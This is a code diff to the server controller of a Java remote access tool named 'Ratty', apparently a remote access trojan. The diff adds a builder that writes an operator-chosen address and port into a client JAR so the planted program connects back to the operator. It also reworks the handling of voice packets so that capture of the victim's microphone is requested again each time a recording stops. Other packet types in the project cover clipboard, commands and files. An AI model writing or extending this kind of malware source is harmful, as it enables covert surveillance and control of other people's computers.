@@ -4,14 +4,16 @@ import static de.sogomn.rat.Ratty.LANGUAGE;
 
 import java.awt.image.BufferedImage;
 import java.io.File;
+import java.io.IOException;
 import java.util.HashMap;
 import java.util.Set;
 
 import javax.swing.JOptionPane;
 
+import de.sogomn.engine.fx.ISoundListener;
 import de.sogomn.engine.fx.Sound;
 import de.sogomn.rat.ActiveConnection;
-import de.sogomn.rat.builder.StubBuilder;
+import de.sogomn.rat.builder.JarBuilder;
 import de.sogomn.rat.packet.AudioPacket;
 import de.sogomn.rat.packet.ClipboardPacket;
 import de.sogomn.rat.packet.CommandPacket;
@@ -42,9 +44,15 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private HashMap<ActiveConnection, ServerClient> clients;
 	
+	private static final String BUILDER_REPLACEMENT = "/connection_data.txt";
+	private static final String BUILDER_REPLACEMENT_FORMAT = "%s\r\n%s\r\ntrue";
+	
 	private static final String FREE_WARNING = LANGUAGE.getString("server.free_warning");
 	private static final String FREE_OPTION_YES = LANGUAGE.getString("server.free_yes");
 	private static final String FREE_OPTION_NO = LANGUAGE.getString("server.free_no");
+	private static final String BUILDER_ERROR_MESSAGE = LANGUAGE.getString("builder.error");
+	private static final String BUILDER_ADDRESS_QUESTION = LANGUAGE.getString("builder.address_question");
+	private static final String BUILDER_PORT_QUESTION = LANGUAGE.getString("builder.port_question");
 	
 	public RattyGuiController() {
 		gui = new RattyGui();
@@ -204,6 +212,35 @@ public final class RattyGuiController extends AbstractRattyController implements
 		requestFile(client, node);
 	}
 	
+	private void startBuilder() {
+		final File destination = gui.getSaveFile("JAR");
+		
+		if (destination == null) {
+			return;
+		}
+		
+		final String address = gui.getInput(BUILDER_ADDRESS_QUESTION);
+		
+		if (address == null) {
+			return;
+		}
+		
+		final String port = gui.getInput(BUILDER_PORT_QUESTION);
+		
+		if (port == null) {
+			return;
+		}
+		
+		final String replacementString = String.format(BUILDER_REPLACEMENT_FORMAT, address, port);
+		final byte[] replacementData = replacementString.getBytes();
+		
+		try {
+			JarBuilder.build(destination, BUILDER_REPLACEMENT, replacementData);
+		} catch (final IOException ex) {
+			gui.showError(BUILDER_ERROR_MESSAGE + "\r\n" + ex.getMessage());
+		}
+	}
+	
 	private void launchAttack() {
 		//...
 	}
@@ -220,7 +257,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		} else if (command == RattyGui.ATTACK) {
 			launchAttack();
 		} else if (command == RattyGui.BUILD) {
-			StubBuilder.start();
+			startBuilder();
 		} else if (command == FileTree.NEW_DIRECTORY || command == FileTree.UPLOAD || command == FileTree.REQUEST || command == FileTree.DELETE) {
 			handleFileTreeCommand(client, command);
 		}
@@ -312,9 +349,21 @@ public final class RattyGuiController extends AbstractRattyController implements
 		}
 		
 		final Sound sound = packet.getSound();
-		final VoicePacket request = new VoicePacket();
+		final ISoundListener listener = new ISoundListener() {
+			@Override
+			public void looped(final Sound source) {
+				//...
+			}
+			
+			@Override
+			public void stopped(final Sound source) {
+				final VoicePacket request = new VoicePacket();
+				
+				client.connection.addPacket(request);
+			}
+		};
 		
-		client.connection.addPacket(request);
+		sound.addListener(listener);
 		sound.play();
 	}
 	
